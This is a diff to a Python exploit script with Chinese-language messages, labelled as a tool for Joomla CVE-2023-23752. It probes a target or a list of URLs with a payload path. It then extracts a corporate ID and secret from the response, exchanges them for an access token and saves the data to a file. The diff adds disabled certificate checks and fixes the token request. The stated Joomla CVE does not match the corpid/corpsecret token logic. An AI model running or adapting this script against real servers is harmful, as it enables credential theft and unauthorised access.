@@ -32,16 +32,16 @@ def checktarget(pattern, url):
     if str(pattern) == 'alone':
         try:
             url1 = '{}{}'.format(url,  payload1)
-            response = requests.get(url=url1, headers=headers)
+            response = requests.get(url=url1, headers=headers, verify=False)
             state = response.status_code
             if state == 200:
                 print('payload1响应成功，目标地址可能存在漏洞，尝试获取更多配置文件信息')
                 responseinfo = json.loads(response.text)
                 corpid = ''.join(responseinfo['strcorpid'])
                 secret = ''.join(responseinfo['Secret'])
-                payload2 = 'cgi-bin/gettoken?corpid={}corpsecret={}'.format(corpid, secret)
+                payload2 = 'cgi-bin/gettoken?corpid={}&corpsecret={}'.format(corpid, secret)
                 url2 = '{}{}'.format(url, payload2)
-                moreresponse = requests.get(url=url2, headers=headers)
+                moreresponse = requests.get(url=url2, headers=headers, verify=False)
                 responseinfo = json.loads(moreresponse.text)
                 f = open('data.txt', 'w')
                 f.write(json.dumps(responseinfo, indent=4))
@@ -49,13 +49,13 @@ def checktarget(pattern, url):
                 print("数据已写入当前路径下data.txt中，请注意查看")
         except Exception as e:
             print(e)
-            print('当前IP执行失败，可能是由于请求不是https，请手动修改第37行代码中的https为http后再次尝试')
+            print('当前IP执行失败，可能不存在该漏洞！')
     else:
         list = openfile(url)
         try:
             for i in list:
                 url = '{}{}'.format(i, payload1)
-                response = requests.get(url=url, headers=headers)
+                response = requests.get(url=url, headers=headers, verify=False)
                 state = response.status_code
                 if state == 200:
                     print('当前URL可能存在漏洞，请手动核实：' + url)
@@ -82,7 +82,7 @@ def openfile(filepath):
 if __name__ == '__main__':
     parser = argparse.ArgumentParser(
         description='python3 joomla(CVE-2023-23752).py -r [Pattern(alone list)] -u [IP Address] ',
-        epilog='python3 -r alone -u https://127.0.0.1 ')
+        epilog='python3 -r alone -u 127.0.0.1 ')
     parser.add_argument('-r', '--run',  help='Pattern(alone list)')
     parser.add_argument('-u', '--url',  help='Destination IP address or IP filepath')
     args = parser.parse_args()
